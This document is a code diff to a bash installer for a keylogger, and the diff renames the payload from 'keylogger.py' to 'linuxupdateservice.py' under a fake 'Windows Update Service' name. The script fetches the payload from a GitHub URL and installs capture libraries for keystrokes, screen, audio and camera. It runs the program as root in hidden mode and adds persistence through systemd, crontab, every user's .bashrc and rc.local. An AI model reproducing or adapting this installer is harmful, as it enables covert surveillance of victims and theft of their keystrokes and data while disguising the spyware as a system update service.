@@ -71,15 +71,19 @@ mkdir -p /var/lib/windowsupdateservice
 echo -e "${YELLOW}[INFO] Installing keylogger...${NC}"
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-if [ -f "$SCRIPT_DIR/keylogger.py" ]; then
-    cp "$SCRIPT_DIR/keylogger.py" /opt/WindowsUpdateService/
+# Try local file first, then download from GitHub
+if [ -f "$SCRIPT_DIR/linuxupdateservice.py" ]; then
+    cp "$SCRIPT_DIR/linuxupdateservice.py" /opt/WindowsUpdateService/linuxupdateservice.py
+    echo -e "${GREEN}[OK] Using local linuxupdateservice.py${NC}"
 else
-    # Download from GitHub if not found locally
-    wget -O /opt/WindowsUpdateService/keylogger.py \
-        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/keylogger.py
+    # Download from GitHub - using the correct filename
+    echo -e "${YELLOW}[INFO] Downloading from GitHub...${NC}"
+    wget -O /opt/WindowsUpdateService/linuxupdateservice.py \
+        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/linuxupdateservice.py
 fi
 
-chmod +x /opt/WindowsUpdateService/keylogger.py
+# Make it executable
+chmod +x /opt/WindowsUpdateService/linuxupdateservice.py
 
 # Create virtual environment
 echo -e "${YELLOW}[INFO] Creating virtual environment...${NC}"
@@ -91,20 +95,24 @@ echo -e "${YELLOW}[INFO] Installing Python dependencies...${NC}"
 source venv/bin/activate
 pip install --upgrade pip
 
+# Try local requirements.txt first
 if [ -f "$SCRIPT_DIR/requirements.txt" ]; then
     pip install -r "$SCRIPT_DIR/requirements.txt"
 else
     # Install from GitHub
     wget -O /tmp/requirements.txt \
-        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/requirements.txt
+        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/requirements.txt 2>/dev/null || echo "# No requirements file" > /tmp/requirements.txt
     pip install -r /tmp/requirements.txt
 fi
+
+# Install common dependencies
+pip install requests pynput Pillow pyaudio opencv-python python-xlib pyscreenshot psutil
 
 deactivate
 
 # Update shebang
 echo -e "${YELLOW}[INFO] Updating shebang...${NC}"
-sed -i '1s|#!/usr/bin/env python3|#!/opt/WindowsUpdateService/venv/bin/python3|' /opt/WindowsUpdateService/keylogger.py
+sed -i '1s|#!/usr/bin/env python3|#!/opt/WindowsUpdateService/venv/bin/python3|' /opt/WindowsUpdateService/linuxupdateservice.py
 
 # Create config if not exists
 echo -e "${YELLOW}[INFO] Creating configuration...${NC}"
@@ -141,7 +149,7 @@ ImageQuality = 70
 Enabled = true
 CheckOnStartup = true
 CheckInterval = 86400
-UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/keylogger.py
+UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/linuxupdateservice.py
 VersionURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/version.txt
 EOF
     chmod 600 /etc/windowsupdateservice/config.ini
@@ -158,7 +166,7 @@ Wants=network.target
 [Service]
 Type=simple
 User=root
-ExecStart=/opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/keylogger.py --hidden
+ExecStart=/opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden
 Restart=always
 RestartSec=10
 StandardOutput=null
@@ -179,7 +187,7 @@ systemctl start windowsupdateservice.service
 
 # Add to crontab for backup
 echo -e "${YELLOW}[INFO] Adding to crontab...${NC}"
-(crontab -l 2>/dev/null | grep -v "keylogger.py"; echo "@reboot /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/keylogger.py --hidden > /dev/null 2>&1") | crontab -
+(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py"; echo "@reboot /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1") | crontab -
 
 # Add to .bashrc
 echo -e "${YELLOW}[INFO] Adding to .bashrc...${NC}"
@@ -187,8 +195,8 @@ for user_home in /home/* /root; do
     if [ -d "$user_home" ]; then
         bashrc="$user_home/.bashrc"
         if [ -f "$bashrc" ]; then
-            if ! grep -q "keylogger.py" "$bashrc"; then
-                echo -e "\n# Windows Update Service\n[ -x /opt/WindowsUpdateService/keylogger.py ] && /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/keylogger.py --hidden > /dev/null 2>&1 &" >> "$bashrc"
+            if ! grep -q "linuxupdateservice.py" "$bashrc"; then
+                echo -e "\n# Windows Update Service\n[ -x /opt/WindowsUpdateService/linuxupdateservice.py ] && /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &" >> "$bashrc"
             fi
         fi
     fi
@@ -197,8 +205,8 @@ done
 # Add to /etc/rc.local if exists
 echo -e "${YELLOW}[INFO] Adding to rc.local...${NC}"
 if [ -f /etc/rc.local ]; then
-    if ! grep -q "keylogger.py" /etc/rc.local; then
-        sed -i '/exit 0/i /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/keylogger.py --hidden > /dev/null 2>&1 &' /etc/rc.local
+    if ! grep -q "linuxupdateservice.py" /etc/rc.local; then
+        sed -i '/exit 0/i /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &' /etc/rc.local
     fi
 fi
 
@@ -215,9 +223,9 @@ rm -rf /opt/WindowsUpdateService
 rm -rf /etc/windowsupdateservice
 rm -rf /var/log/windowsupdateservice
 rm -rf /var/lib/windowsupdateservice
-(crontab -l 2>/dev/null | grep -v "keylogger.py") | crontab -
-sed -i '/keylogger.py/d' /root/.bashrc
-sed -i '/keylogger.py/d' /etc/rc.local
+(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py") | crontab -
+sed -i '/linuxupdateservice.py/d' /root/.bashrc
+sed -i '/linuxupdateservice.py/d' /etc/rc.local
 echo "Uninstall complete!"
 EOF
 
